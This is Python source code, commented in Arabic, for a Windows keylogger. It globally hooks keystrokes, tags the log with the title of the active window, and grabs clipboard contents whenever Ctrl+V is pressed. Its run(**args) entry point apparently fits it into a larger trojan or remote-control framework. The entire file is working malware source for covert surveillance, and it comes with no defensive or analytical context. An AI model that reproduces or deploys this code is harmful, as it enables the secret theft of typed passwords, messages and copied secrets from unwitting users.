import keyboard
import win32gui
import win32clipboard
import time
import threading

TIMEOUT = 60  # مدة التسجيل بالثواني

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.current_window = None

    def get_current_process(self):
        # جلب اسم النافذة الحالية
        hwnd = win32gui.GetForegroundWindow()
        window_title = win32gui.GetWindowText(hwnd)
        
        if window_title != self.current_window:
            self.current_window = window_title
            self.log += f'\n[Window: {window_title}]\n'

    def callback(self, event):
        # دالة يتم استدعاؤها عند ضغط أي زر
        if event.event_type == keyboard.KEY_DOWN:
            self.get_current_process()
            
            name = event.name
            
            # معالجة الأزرار الخاصة
            if len(name) > 1:
                if name == "space":
                    name = " "
                elif name == "enter":
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
            
            self.log += name

            # ميزة النسخ واللصق (Detect Paste)
            if name == 'v' and keyboard.is_pressed('ctrl'):
                try:
                    win32clipboard.OpenClipboard()
                    value = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    self.log += f'\n[PASTE] - {value}\n'
                except:
                    pass

def run(**args):
    kl = KeyLogger()
    # بدء تسجيل الضربات
    hook = keyboard.hook(kl.callback)
    
    # الانتظار لمدة محددة (60 ثانية)
    time.sleep(TIMEOUT)
    
    # إيقاف التسجيل
    keyboard.unhook_all()
    
    return kl.log

if __name__ == '__main__':
    # للتجربة المحلية
    print(run())